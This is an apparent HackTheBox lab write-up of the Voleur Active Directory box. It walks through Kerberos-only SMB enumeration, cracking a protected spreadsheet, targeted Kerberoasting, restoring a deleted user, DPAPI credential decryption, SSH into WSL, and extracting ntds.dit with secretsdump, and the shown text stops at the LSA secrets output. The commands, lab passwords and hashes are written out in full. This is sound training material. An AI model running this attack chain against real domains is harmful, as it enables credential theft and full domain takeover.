---
icon: handcuffs
---

# HTB-VOLEUR

<figure><img src="../../../../.gitbook/assets/image (506).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
As is common in real life Windows pentests, you will start the Voleur box with credentials for the following account: `ryan.naylor:HollowOct31Nyt`
{% endhint %}

### Initial Reconnaissance <a href="#reconnaissance" id="reconnaissance"></a>

#### Port Scanning & Service Enumeration

The reconnaissance phase revealed that the target is a **Domain Controller** for the `voleur.htb` domain. The nmap scan showed multiple critical services running:Reconnaissance

```
(sn0x㉿sn0x)-[~/HTB/Voluer]
└─$ Rustscan - blah blah commands
```

Output

```
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-10-29 06:30:40Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: voleur.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
2222/tcp  open  ssh           OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 42:40:39:30:d6:fc:44:95:37:e1:9b:88:0b:a2:d7:71 (RSA)
|   256 ae:d9:c2:b8:7d:65:6f:58:c8:f4:ae:4f:e4:e8:cd:94 (ECDSA)
|_  256 53:ad:6b:6c:ca:ae:1b:40:44:71:52:95:29:b1:bb:c1 (ED25519)
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: voleur.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49749/tcp open  msrpc         Microsoft Windows RPC
50691/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
50692/tcp open  msrpc         Microsoft Windows RPC
50694/tcp open  msrpc         Microsoft Windows RPC
50720/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OSs: Windows, Linux; CPE: cpe:/o:microsoft:windows, cpe:/o:linux:linux_kernel
Host script results:
|_clock-skew: 7h59m55s
| smb2-time:
|   date: 2025-10-29T06:31:35
|_  start_date: N/A
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required

```

The target system serves as the Domain Controller (DC) for the `voleur.htb` domain, which I've added to my `/etc/hosts` file for proper name resolution.

Interestingly, SSH is running on the non-standard port 2222, and nmap identifies the operating system as Ubuntu. This suggests that either Windows Subsystem for Linux (WSL) or a container is running alongside the Windows host environment.

#### Adding to /etc/hosts

Before proceeding, I added the domain and DC to my `/etc/hosts` file:

```bash
(sn0x㉿sn0x)-[~/HTB/Voluer] 
└─$ sudo nano /etc/hosts
```

Add the following line:

```
10.129.232.130  dc.voleur.htb voleur.htb
```

***

### Initial Access

#### Starting Credentials

As mentioned in the box description, we start with valid domain credentials:

**Username**: `ryan.naylor`\
**Password**: `HollowOct31Nyt`

This simulates a realistic penetration testing scenario where you've obtained initial credentials through social engineering, password spraying, or other means.

***

### Privilege Escalation Path

### Access as svc\_ldap

**Enumerating SMB Shares**

With our initial credentials, I attempted to enumerate SMB shares. However, since **NTLM authentication is disabled**, I needed to use the `-k` flag for Kerberos authentication. Additionally, due to the 8-hour clock skew, I used `faketime` to adjust the time.

```bash
(sn0x㉿sn0x)-[~/HTB/Voluer] 
└─$ faketime -f +8h nxc smb dc.voleur.htb -u ryan.naylor -p 'HollowOct31Nyt' -k --shares
```

**Output:**

```
SMB         dc.voleur.htb   445    dc               [*]  x64 (name:dc) (domain:voleur.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         dc.voleur.htb   445    dc               [+] voleur.htb\ryan.naylor:HollowOct31Nyt 
SMB         dc.voleur.htb   445    dc               [*] Enumerated shares
SMB         dc.voleur.htb   445    dc               Share           Permissions     Remark
SMB         dc.voleur.htb   445    dc               -----           -----------     ------
SMB         dc.voleur.htb   445    dc               ADMIN$                          Remote Admin
SMB         dc.voleur.htb   445    dc               C$                              Default share
SMB         dc.voleur.htb   445    dc               Finance                         
SMB         dc.voleur.htb   445    dc               HR                              
SMB         dc.voleur.htb   445    dc               IPC$            READ            Remote IPC
SMB         dc.voleur.htb   445    dc               IT              READ            
SMB         dc.voleur.htb   445    dc               NETLOGON        READ            Logon server share 
SMB         dc.voleur.htb   445    dc               SYSVOL          READ            Logon server share
```

**Analysis**: Ryan has READ access to several shares, most notably the **IT** share. This is a common finding in Active Directory environments where IT shares contain sensitive information.

**Spidering the IT Share**

Let's search for interesting files in the IT share:

```bash
(sn0x㉿sn0x)-[~/HTB/Voluer] 
└─$ faketime -f +8h nxc smb dc.voleur.htb -u ryan.naylor -p 'HollowOct31Nyt' -k --spider IT --regex .
```

**Output:**

```
SMB         dc.voleur.htb   445    dc               [*]  x64 (name:dc) (domain:voleur.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         dc.voleur.htb   445    dc               [+] voleur.htb\ryan.naylor:HollowOct31Nyt 
SMB         dc.voleur.htb   445    dc               [*] Spidering .
SMB         dc.voleur.htb   445    dc               //dc.voleur.htb/IT/. [dir]
SMB         dc.voleur.htb   445    dc               //dc.voleur.htb/IT/.. [dir]
SMB         dc.voleur.htb   445    dc               //dc.voleur.htb/IT/First-Line Support [dir]
SMB         dc.voleur.htb   445    dc               //dc.voleur.htb/IT/First-Line Support/. [dir]
SMB         dc.voleur.htb   445    dc               //dc.voleur.htb/IT/First-Line Support/.. [dir]
SMB         dc.voleur.htb   445    dc               //dc.voleur.htb/IT/First-Line Support/Access_Review.xlsx [lastm:'2025-05-30 00:23' size:16896]
```

**Discovery**: Found an Excel file named `Access_Review.xlsx` in the "First-Line Support" directory. This is interesting because access review files often contain usernames, permissions, and sometimes even passwords.

**Downloading the Excel File**

```bash
(sn0x㉿sn0x)-[~/HTB/Voluer] 
└─$ faketime -f +8h nxc smb dc.voleur.htb -u ryan.naylor -p 'HollowOct31Nyt' -k --share IT --get-file 'First-Line Support/Access_Review.xlsx' Access_Review.xlsx
```

**Output:**

```
SMB         dc.voleur.htb   445    dc               [*]  x64 (name:dc) (domain:voleur.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         dc.voleur.htb   445    dc               [+] voleur.htb\ryan.naylor:HollowOct31Nyt 
SMB         dc.voleur.htb   445    dc               [*] Copying "First-Line Support/Access_Review.xlsx" to "Access_Review.xlsx"
SMB         dc.voleur.htb   445    dc               [+] File "First-Line Support/Access_Review.xlsx" was downloaded to "Access_Review.xlsx"
```

**Dealing with Password-Protected Excel File**

Let's check the file type:

```bash
(sn0x㉿sn0x)-[~/HTB/Voluer] 
└─$ file Access_Review.xlsx
```

**Output:**

```
Access_Review.xlsx: CDFV2 Encrypted
```

**Problem**: The Excel file is password-protected! This is a common security practice, but weak passwords can be cracked.

**Extracting Hash with office2john**

```bash
(sn0x㉿sn0x)-[~/HTB/Voluer] 
└─$ office2john Access_Review.xlsx > hash
```

This command extracts the password hash from the Office document in a format that can be cracked by John the Ripper or Hashcat.

**Cracking the Password with John the Ripper**

```bash
(sn0x㉿sn0x)-[~/HTB/Voluer] 
└─$ john hash --wordlist=/usr/share/wordlists/rockyou.txt --fork=10
```

**Output:**

```
Created directory: /home/sn0x/.john
Using default input encoding: UTF-8
Loaded 1 password hash (Office, 2007/2010/2013 [SHA1 256/256 AVX2 8x / SHA512 256/256 AVX2 4x AES])
Cost 1 (MS Office version) is 2013 for all loaded hashes
Cost 2 (iteration count) is 100000 for all loaded hashes
Node numbers 1-10 of 10 (fork)
Press 'q' or Ctrl-C to abort, almost any other key for status
football1        (Access_Review.xlsx)
```

**Success!** The password is `football1` - a common weak password that appeared in the rockyou.txt wordlist.

**Analyzing the Excel File**

After opening the file with the password `football1` in LibreOffice (or Excel), I discovered the following credentials:

| Username          | Password           |
| ----------------- | ------------------ |
| svc\_ldap         | M1XyC9pW7qT5Vn     |
| svc\_iis          | N5pXyW1VqM7CZ8     |
| (Deleted Account) | NightT1meP1dg3on14 |

**Key Findings**:

* Two active service accounts with credentials
* One password for what appears to be a deleted account
* Service accounts are high-value targets as they often have elevated privileges

**Password Spraying**

Let's verify these credentials and try password spraying:

```bash
(sn0x㉿sn0x)-[~/HTB/Voluer] 
└─$ faketime -f +8h nxc smb dc.voleur.htb -u svc_ldap -p 'M1XyC9pW7qT5Vn' -k
```

The `svc_ldap` credentials are valid! Service accounts with LDAP in the name typically have permissions to query Active Directory, making them valuable for enumeration.

**Collecting BloodHound Data**

BloodHound is an essential tool for Active Directory enumeration. It maps out privilege escalation paths by analyzing relationships between objects.

```bash
(sn0x㉿sn0x)-[~/HTB/Voluer] 
└─$ faketime -f +8h bloodhound-ce-python --domain voleur.htb --username 'svc_ldap' --password 'M1XyC9pW7qT5Vn' --kerberos --nameserver 10.129.232.130 --dns-tcp --collection ALL --zip
```

**Output:**

```
INFO: BloodHound.py for BloodHound Community Edition
INFO: Found AD domain: voleur.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc.voleur.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc.voleur.htb
INFO: Found 12 users
INFO: Found 56 groups
INFO: Found 2 gpos
INFO: Found 5 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC.voleur.htb
INFO: Done in 00M 32S
INFO: Compressing output into 20251029041357_bloodhound.zip
```

This collected comprehensive information about the domain including users, groups, computers, and their relationships.

***

### Shell as svc\_winrm

**Analyzing BloodHound Data**

After importing the collected data into BloodHound, I analyzed the attack paths from `svc_ldap`. The graph revealed two critical outbound edges:

<figure><img src="../../../../.gitbook/assets/image (507).png" alt=""><figcaption></figcaption></figure>

**Finding**: `svc_ldap` has **AddKeyCredentialLink** permission on `svc_winrm`

**What this means**:

* The `svc_ldap` account can modify the `msDS-KeyCredentialLink` attribute of `svc_winrm`
* This allows us to perform **Targeted Kerberoasting**
* We can add a Service Principal Name (SPN) to `svc_winrm`, request a Kerberos ticket, and crack it offline

**Requesting a TGT**

First, we need a Ticket Granting Ticket (TGT) for authentication:

```bash
(sn0x㉿sn0x)-[~/HTB/Voluer] 
└─$ faketime -f +8h impacket-getTGT VOLEUR.HTB/svc_ldap:'M1XyC9pW7qT5Vn'
```

**Output:**

```
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
 
[*] Saving ticket in svc_ldap.ccache
```

The TGT is saved in the `svc_ldap.ccache` file. We need to export this for use:

```bash
(sn0x㉿sn0x)-[~/HTB/Voluer] 
└─$ export KRB5CCNAME=svc_ldap.ccache
```

**Performing Targeted Kerberoasting**

Now we can use targetedKerberoast.py to exploit the permission:

```bash
(sn0x㉿sn0x)-[~/HTB/Voluer] 
└─$ faketime -f +8h targetedKerberoast.py -u 'svc_ldap' -p 'M1XyC9pW7qT5Vn' -d 'voleur.htb' --dc-host dc.voleur.htb -k --request-user 'svc_winrm'
```

**Output:**

```
[*] Starting kerberoast attacks
[*] Attacking user (svc_winrm)
[+] Printing hash for (svc_winrm)
$krb5tgs$23$*svc_winrm$VOLEUR.HTB$voleur.htb/svc_winrm*$95bdf29ff<SNIP>
```

**Success!** We obtained a Kerberos TGS (Ticket Granting Service) hash for `svc_winrm`.

**Cracking the Hash with Hashcat**

Save the hash to a file and crack it:

```bash
(sn0x㉿sn0x)-[~/HTB/Voluer] 
└─$ hashcat -m 13100 svc_winrm.hash /usr/share/wordlists/rockyou.txt
```

**Result**: The password is `AFireInsidedeOzarctica980219afi`

This is a longer password combining the band name "A Fire Inside" (AFI), the song "Antarctica", and some numbers. Still crackable with a good wordlist.

**Getting a Shell with Evil-WinRM**

```bash
(sn0x㉿sn0x)-[~/HTB/Voluer] 
└─$ faketime -f +8h evil-winrm -i dc.voleur.htb -u svc_winrm -p 'AFireInsidedeOzarctica980219afi'
```

We now have an interactive PowerShell session on the Domain Controller! However, after enumeration, `svc_winrm` appears to be a dead end with no additional useful privileges.

***

### Access as todd.wolfe

**Checking for Additional Rights with bloodyAD**

Since `svc_winrm` didn't lead anywhere, let's check if `svc_ldap` has other permissions we missed:

```bash
(sn0x㉿sn0x)-[~/HTB/Voluer] 
└─$ faketime -f +8h bloodyAD --host dc.voleur.htb --domain voleur.htb --username 'svc_ldap' --password 'M1XyC9pW7qT5Vn' --kerberos get writable --include-del
```

**Output:**

```
distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=voleur,DC=htb
objectSid: S-1-5-11
permission: WRITE
 
distinguishedName: OU=Second-Line Support Technicians,DC=voleur,DC=htb
permission: CREATE_CHILD; WRITE
 
distinguishedName: CN=Lacey Miller,OU=Second-Line Support Technicians,DC=voleur,DC=htb
objectSid: S-1-5-21-3927696377-1337352550-2781715495-1105
permission: CREATE_CHILD; WRITE
 
distinguishedName: CN=svc_ldap,OU=Service Accounts,DC=voleur,DC=htb
objectSid: S-1-5-21-3927696377-1337352550-2781715495-1106
permission: WRITE
 
distinguishedName: CN=Todd Wolfe\0ADEL:1c6b1deb-c372-4cbb-87b1-15031de169db,CN=Deleted Objects,DC=voleur,DC=htb
objectSid: S-1-5-21-3927696377-1337352550-2781715495-1110
permission: CREATE_CHILD; WRITE
 
distinguishedName: CN=svc_winrm,OU=Service Accounts,DC=voleur,DC=htb
objectSid: S-1-5-21-3927696377-1337352550-2781715495-1601
permission: WRITE
```

**Critical Discovery**: The `--include-del` flag revealed a **deleted user object** named `Todd Wolfe`!

**Why this matters**:

* `svc_ldap` has WRITE permissions on this deleted user
* The Excel file contained the password `NightT1meP1dg3on14` for a deleted account
* We can restore deleted AD objects if we have proper permissions

**Restoring the Deleted User**

```bash
(sn0x㉿sn0x)-[~/HTB/Voluer] 
└─$ faketime -f +8h bloodyAD --host dc.voleur.htb --domain voleur.htb --username 'svc_ldap' --password 'M1XyC9pW7qT5Vn' --kerberos set restore todd.wolfe
```

**Output:**

```
[+] todd.wolfe has been restored successfully under CN=Todd Wolfe,OU=Second-Line Support Technicians,DC=voleur,DC=htb
```

**Success!** The deleted user account has been restored to Active Directory.

**Verifying todd.wolfe Credentials**

```bash
(sn0x㉿sn0x)-[~/HTB/Voluer] 
└─$ faketime -f +8h nxc smb dc.voleur.htb -u todd.wolfe -p 'NightT1meP1dg3on14' -k --shares
```

**Output:**

```
SMB         dc.voleur.htb   445    dc               [*]  x64 (name:dc) (domain:voleur.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         dc.voleur.htb   445    dc               [+] voleur.htb\todd.wolfe:NightT1meP1dg3on14 
SMB         dc.voleur.htb   445    dc               [*] Enumerated shares
SMB         dc.voleur.htb   445    dc               Share           Permissions     Remark
SMB         dc.voleur.htb   445    dc               -----           -----------     ------
SMB         dc.voleur.htb   445    dc               ADMIN$                          Remote Admin
SMB         dc.voleur.htb   445    dc               C$                              Default share
SMB         dc.voleur.htb   445    dc               Finance                         
SMB         dc.voleur.htb   445    dc               HR                              
SMB         dc.voleur.htb   445    dc               IPC$            READ            Remote IPC
SMB         dc.voleur.htb   445    dc               IT              READ            
SMB         dc.voleur.htb   445    dc               NETLOGON        READ            Logon server share 
SMB         dc.voleur.htb   445    dc               SYSVOL          READ            Logon server share
```

The password still works! The account has the same share access as `ryan.naylor` initially, but as a Second-Line Support Technician, `todd.wolfe` likely has access to different content.

***

### Access as jeremy.combs

**Spidering IT Share as todd.wolfe**

Let's search for new files accessible to todd.wolfe:

```bash
(sn0x㉿sn0x)-[~/HTB/Voluer] 
└─$ faketime -f +8h nxc smb dc.voleur.htb -u todd.wolfe -p 'NightT1meP1dg3on14' -k --spider IT --regex '.'
```

**Output:**

```
SMB         dc.voleur.htb   445    dc               [*]  x64 (name:dc) (domain:voleur.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         dc.voleur.htb   445    dc               [+] voleur.htb\todd.wolfe:NightT1meP1dg3on14
SMB         dc.voleur.htb   445    dc               [*] Spidering .
SMB         dc.voleur.htb   445    dc               //dc.voleur.htb/IT/. [dir]
SMB         dc.voleur.htb   445    dc               //dc.voleur.htb/IT/.. [dir]
SMB         dc.voleur.htb   445    dc               //dc.voleur.htb/IT/Second-Line Support [dir]
--- SNIP ---
SMB         dc.voleur.htb   445    dc               //dc.voleur.htb/IT/Second-Line Support/Archived Users/todd.wolfe/AppData/Local/Microsoft/Credentials/DFBE70A7E5CC19A398EBF1B96859CE5D [lastm:'2025-01-29 14:06' size:11068]
--- SNIP ---
SMB         dc.voleur.htb   445    dc               //dc.voleur.htb/IT/Second-Line Support/Archived Users/todd.wolfe/AppData/Roaming/Microsoft/Protect/S-1-5-21-3927696377-1337352550-2781715495-1110/08949382-134f-4c63-b93c-ce52efc0aa88
```

**Major Discovery**: Found **DPAPI (Data Protection API) files** for todd.wolfe!

**What is DPAPI?**

* Windows uses DPAPI to encrypt sensitive data like saved credentials, certificates, and passwords
* The encrypted data (credential blob) is stored in `AppData/Local/Microsoft/Credentials/`
* The decryption keys (masterkeys) are stored in `AppData/Roaming/Microsoft/Protect/`
* With the user's password, we can decrypt these files to recover stored credentials

**Files Found**:

1. **Credential Blob**: `DFBE70A7E5CC19A398EBF1B96859CE5D`
2. **Masterkey**: `08949382-134f-4c63-b93c-ce52efc0aa88`
3. **User SID**: `S-1-5-21-3927696377-1337352550-2781715495-1110` (from the file path)

**Downloading DPAPI Files**

Download the credential blob:

```bash
(sn0x㉿sn0x)-[~/HTB/Voluer] 
└─$ faketime -f +8h nxc smb dc.voleur.htb -u todd.wolfe -p 'NightT1meP1dg3on14' -k --share IT --get-file "Second-Line Support/Archived Users/todd.wolfe/AppData/Local/Microsoft/Credentials/DFBE70A7E5CC19A398EBF1B96859CE5D" DFBE70A7E5CC19A398EBF1B96859CE5D
```

**Output:**

```
SMB         dc.voleur.htb   445    dc               [*]  x64 (name:dc) (domain:voleur.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         dc.voleur.htb   445    dc               [+] voleur.htb\todd.wolfe:NightT1meP1dg3on14
SMB         dc.voleur.htb   445    dc               [*] Copying "Second-Line Support/Archived Users/todd.wolfe/AppData/Local/Microsoft/Credentials/DFBE70A7E5CC19A398EBF1B96859CE5D" to "DFBE70A7E5CC19A398EBF1B96859CE5D"
SMB         dc.voleur.htb   445    dc               [+] File "Second-Line Support/Archived Users/todd.wolfe/AppData/Local/Microsoft/Credentials/DFBE70A7E5CC19A398EBF1B96859CE5D" was downloaded to "DFBE70A7E5CC19A398EBF1B96859CE5D"
```

Download the masterkey:

```bash
(sn0x㉿sn0x)-[~/HTB/Voluer] 
└─$ faketime -f +8h nxc smb dc.voleur.htb -u todd.wolfe -p 'NightT1meP1dg3on14' -k --share IT --get-file "Second-Line Support/Archived Users/todd.wolfe/AppData/Roaming/Microsoft/Protect/S-1-5-21-3927696377-1337352550-2781715495-1110/08949382-134f-4c63-b93c-ce52efc0aa88" 08949382-134f-4c63-b93c-ce52efc0aa88
```

**Output:**

```
SMB         dc.voleur.htb   445    dc               [*]  x64 (name:dc) (domain:voleur.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         dc.voleur.htb   445    dc               [+] voleur.htb\todd.wolfe:NightT1meP1dg3on14
SMB         dc.voleur.htb   445    dc               [*] Copying "Second-Line Support/Archived Users/todd.wolfe/AppData/Roaming/Microsoft/Protect/S-1-5-21-3927696377-1337352550-2781715495-1110/08949382-134f-4c63-b93c-ce52efc0aa88" to "08949382-134f-4c63-b93c-ce52efc0aa88"
SMB         dc.voleur.htb   445    dc               [+] File "Second-Line Support/Archived Users/todd.wolfe/AppData/Roaming/Microsoft/Protect/S-1-5-21-3927696377-1337352550-2781715495-1110/08949382-134f-4c63-b93c-ce52efc0aa88" was downloaded to "08949382-134f-4c63-b93c-ce52efc0aa88"
```

**Decrypting the DPAPI Masterkey**

To decrypt DPAPI data, we need:

1. User's SID: `S-1-5-21-3927696377-1337352550-2781715495-1110`
2. User's password: `NightT1meP1dg3on14`
3. Masterkey file: `08949382-134f-4c63-b93c-ce52efc0aa88`

```bash
(sn0x㉿sn0x)-[~/HTB/Voluer] 
└─$ impacket-dpapi masterkey -sid S-1-5-21-3927696377-1337352550-2781715495-1110 -password 'NightT1meP1dg3on14' -file 08949382-134f-4c63-b93c-ce52efc0aa88
```

**Output:**

```
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
 
[MASTERKEYFILE]
Version     :        2 (2)
Guid        : 08949382-134f-4c63-b93c-ce52efc0aa88
Flags       :        0 (0)
Policy      :        0 (0)
MasterKeyLen: 00000088 (136)
BackupKeyLen: 00000068 (104)
CredHistLen : 00000000 (0)
DomainKeyLen: 00000174 (372)
 
Decrypted key with User Key (MD4 protected)
Decrypted key: 0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83
```

**Success!** We decrypted the masterkey. The decrypted key is:

```
0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83
```

**Decrypting the Credential Blob**

Now we can use the decrypted masterkey to decrypt the credential blob:

```bash
(sn0x㉿sn0x)-[~/HTB/Voluer] 
└─$ impacket-dpapi credential -file DFBE70A7E5CC19A398EBF1B96859CE5D -key 0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83
```

**Output:**

```
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
 
[CREDENTIAL]
LastWritten : 2025-01-29 12:55:19+00:00
Flags       : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH)
Persist     : 0x00000003 (CRED_PERSIST_ENTERPRISE)
Type        : 0x00000002 (CRED_TYPE_DOMAIN_PASSWORD)
Target      : Domain:target=Jezzas_Account
Description :
Unknown     :
Username    : jeremy.combs
Unknown     : qT3V9pLXyN7W4m
```

**Jackpot!** We recovered stored domain credentials:

**Username**: `jeremy.combs`\
**Password**: `qT3V9pLXyN7W4m`

**Analysis**: The credential was stored with the target description "Jezzas\_Account", likely a nickname. This demonstrates how users often save credentials in Windows Credential Manager, which can be exploited if we have access to their DPAPI files and password.

***

### Shell as svc\_backup

**Checking BloodHound for jeremy.combs**

Looking at the BloodHound graph, `jeremy.combs` is a member of the **Third-Line Support** group. This suggests access to more privileged areas of the IT share.

**Spidering IT Share as jeremy.combs**

```bash
(sn0x㉿sn0x)-[~/HTB/Voluer] 
└─$ faketime -f +8h nxc smb dc.voleur.htb -u jeremy.combs -p 'qT3V9pLXyN7W4m' -k --spider IT --regex '.'
```

**Output:**

```
SMB         dc.voleur.htb   445    dc               [*]  x64 (name:dc) (domain:voleur.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         dc.voleur.htb   445    dc               [+] voleur.htb\jeremy.combs:qT3V9pLXyN7W4m 
SMB         dc.voleur.htb   445    dc               [*] Spidering .
SMB         dc.voleur.htb   445    dc               //dc.voleur.htb/IT/. [dir]
SMB         dc.voleur.htb   445    dc               //dc.voleur.htb/IT/.. [dir]
SMB         dc.voleur.htb   445    dc               //dc.voleur.htb/IT/Third-Line Support [dir]
SMB         dc.voleur.htb   445    dc               //dc.voleur.htb/IT/Third-Line Support/. [dir]
SMB         dc.voleur.htb   445    dc               //dc.voleur.htb/IT/Third-Line Support/.. [dir]
SMB         dc.voleur.htb   445    dc               //dc.voleur.htb/IT/Third-Line Support/id_rsa [lastm:'2025-01-30 17:11' size:2602]
SMB         dc.voleur.htb   445    dc               //dc.voleur.htb/IT/Third-Line Support/Note.txt.txt [lastm:'2025-01-30 17:07' size:186]
```

**Excellent Discovery!** Found two critical files:

1. **id\_rsa**: A private SSH key (2602 bytes - encrypted RSA key)
2. **Note.txt.txt**: A text file that might explain the SSH key's purpose

**Downloading the Files**

Download the SSH private key:

```bash
(sn0x㉿sn0x)-[~/HTB/Voluer] 
└─$ faketime -f +8h nxc smb dc.voleur.htb -u jeremy.combs -p 'qT3V9pLXyN7W4m' -k --share IT --get-file 'Third-Line Support/id_rsa' id_rsa
```

**Output:**

```
SMB         dc.voleur.htb   445    dc               [*]  x64 (name:dc) (domain:voleur.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         dc.voleur.htb   445    dc               [+] voleur.htb\jeremy.combs:qT3V9pLXyN7W4m 
SMB         dc.voleur.htb   445    dc               [*] Copying "Third-Line Support/id_rsa" to "id_rsa"
SMB         dc.voleur.htb   445    dc               [+] File "Third-Line Support/id_rsa" was downloaded to "id_rsa"
```

Download the note:

```bash
(sn0x㉿sn0x)-[~/HTB/Voluer] 
└─$ faketime -f +8h nxc smb dc.voleur.htb -u jeremy.combs -p 'qT3V9pLXyN7W4m' -k --share IT --get-file 'Third-Line Support/Note.txt.txt' Note.txt.txt
```

**Output:**

```
SMB         dc.voleur.htb   445    dc               [*]  x64 (name:dc) (domain:voleur.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         dc.voleur.htb   445    dc               [+] voleur.htb\jeremy.combs:qT3V9pLXyN7W4m 
SMB         dc.voleur.htb   445    dc               [*] Copying "Third-Line Support/Note.txt.txt" to "Note.txt.txt"
SMB         dc.voleur.htb   445    dc               [+] File "Third-Line Support/Note.txt.txt" was downloaded to "Note.txt.txt"
```

**Reading the Note**

```bash
(sn0x㉿sn0x)-[~/HTB/Voluer] 
└─$ cat Note.txt.txt
```

**Content:**

```
Jeremy,
 
I've had enough of Windows Backup! I've part configured WSL to see if we can utilize any of the backup tools from Linux.
 
Please see what you can set up.
 
Thanks,
 
Admin
```

**Key Information**:

* The admin is frustrated with Windows Backup
* WSL (Windows Subsystem for Linux) has been configured
* They want to use Linux backup tools
* This explains the SSH service on port 2222 we found during reconnaissance!

**Connecting via SSH**

Remember from our initial scan, port **2222** is running SSH. The note mentions WSL, and we have an SSH key. Let's try connecting with the service account `svc_backup`:

First, set proper permissions on the private key:

```bash
(sn0x㉿sn0x)-[~/HTB/Voluer] 
└─$ chmod 600 id_rsa
```

Connect via SSH:

```bash
(sn0x㉿sn0x)-[~/HTB/Voluer] 
└─$ ssh -i id_rsa -p 2222 svc_backup@dc.voleur.htb
```

**Success!** We're now in a **WSL (Windows Subsystem for Linux)** shell as `svc_backup`.

**What is WSL?** WSL allows running a Linux environment directly on Windows without the overhead of a virtual machine. Importantly, WSL can access Windows files through the `/mnt/c/` mount point.

**Exploring the WSL Environment**

Let's see what we can access:

```bash
svc_backup@DC:~$ ls -la /mnt/c/
```

The Windows C: drive is mounted at `/mnt/c/`. Let's look for the IT share and specifically the Third-Line Support backups:

```bash
svc_backup@DC:~$ find /mnt/c/IT/Third-Line\ Support/Backups/
```

**Output:**

```
/mnt/c/IT/Third-Line Support/Backups/
/mnt/c/IT/Third-Line Support/Backups/Active Directory
/mnt/c/IT/Third-Line Support/Backups/Active Directory/ntds.dit
/mnt/c/IT/Third-Line Support/Backups/Active Directory/ntds.jfm
/mnt/c/IT/Third-Line Support/Backups/registry
/mnt/c/IT/Third-Line Support/Backups/registry/SECURITY
/mnt/c/IT/Third-Line Support/Backups/registry/SYSTEM
```

**CRITICAL DISCOVERY!** We found:

1. **ntds.dit**: The Active Directory database containing ALL domain user hashes
2. **ntds.jfm**: The transaction log file for the database
3. **SYSTEM**: Registry hive containing the Boot Key (SYSKEY) needed to decrypt ntds.dit
4. **SECURITY**: Registry hive containing additional secrets

**Why this is devastating**:

* The `ntds.dit` file is the heart of Active Directory
* It contains NTLM password hashes for ALL domain users including Domain Admins
* With the SYSTEM registry hive, we can decrypt these hashes
* This is a complete domain compromise

***

### Domain Compromise - Administrator Access

**Exfiltrating the Backup Files**

We need to transfer these files to our attacking machine. Using `scp` with the SSH key:

```bash
(sn0x㉿sn0x)-[~/HTB/Voluer] 
└─$ scp -i id_rsa -P 2222 -r svc_backup@dc.voleur.htb:'/mnt/c/IT/Third-Line Support/Backups' .
```

**Output:**

```
ntds.dit                                      100%   18MB   2.1MB/s   00:08
ntds.jfm                                      100% 16KB    1.2MB/s   00:00
SECURITY                                      100%  256KB  2.5MB/s   00:00
SYSTEM                                        100%  17MB   2.3MB/s   00:07
```

All critical files have been downloaded to our local machine.

**Extracting Domain Hashes with secretsdump**

Now we use Impacket's `secretsdump` to extract all the password hashes from the ntds.dit file:

```bash
(sn0x㉿sn0x)-[~/HTB/Voluer] 
└─$ impacket-secretsdump -ntds 'Backups/Active Directory/ntds.dit' -system 'Backups/registry/SYSTEM' -security 'Backups/registry/SECURITY' local
```

**Output:**

```
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
 
[*] Target system bootKey: 0xbbdd1a32433b87bcc9b875321b883d2d
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC
